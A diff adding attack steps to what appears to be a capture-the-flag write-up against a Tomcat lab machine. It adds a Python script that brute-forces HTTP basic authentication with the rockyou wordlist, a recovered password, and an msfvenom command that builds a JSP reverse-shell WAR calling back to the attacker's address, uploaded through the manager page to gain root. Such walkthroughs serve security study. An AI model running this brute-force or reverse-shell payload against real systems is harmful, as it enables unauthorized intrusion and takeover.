@@ -42,6 +42,23 @@ Hey bob, did you update that TomCat server?
 
 - in `protected`, it asks for basic authentication
 - write python script to check password
+
+```python
+import requests 
+
+url = "http://10.10.39.251/protected/"
+s = requests.Session()
+
+with open('/usr/share/wordlists/rockyou.txt', 'r', errors='replace') as f:
+    pwds = f.readlines()
+    for pwd in pwds:
+        pwd = pwd.strip()
+        r  =requests.get(url, auth=('bob', pwd))
+
+        print(f"> {pwd} - {r.status_code}")
+        if r.status_code != 401:
+            break 
+```
 - found `bob:bubbles`
 
 ### 1234/http
@@ -57,7 +74,26 @@ host-manager  [Status: 302, Size: 0, Words: 1, Lines: 1]
 manager       [Status: 302, Size: 0, Words: 1, Lines: 1]
 
 ```
+- can enter manager login page with above credentials
 
-## Get User Access
+![](screenshots/2023-03-19-12-26-22.png)
 
-## Get Root Access
+- first create payload with war file which will connect to our local machine
+
+```sh
+msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.11.8.57 LPORT=4242 -f war -o revshell.war
+```
+
+- then upload that revshell.war file here
+
+![](screenshots/2023-03-19-12-42-53.png)
+
+- listen with nc at local machine and click this
+
+![](screenshots/2023-03-19-12-43-37.png)
+
+![](screenshots/2023-03-19-12-43-56.png)
+
+- got root access directly
+
+---
